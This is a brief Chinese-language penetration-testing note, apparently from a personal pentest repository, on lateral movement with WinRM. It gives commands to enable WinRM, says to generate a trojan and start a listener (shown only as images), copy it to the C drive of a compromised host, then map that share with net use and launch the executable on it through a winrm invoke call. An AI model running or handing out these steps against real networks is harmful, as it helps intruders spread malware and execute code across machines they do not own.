	>winrm quickconfig –q启动winrm
	或PS>Enable-PSRemoting -Force
	生成木马并启动监听
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/446.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/447.png)

	放入已获得权限的机器C盘中
	内网另外机器中执行
	>net use \\192.168.0.115\c$
	>winrm invoke create wmicimv2/win32_process @{commandline="\\192.168.0.115\c\index.exe"}
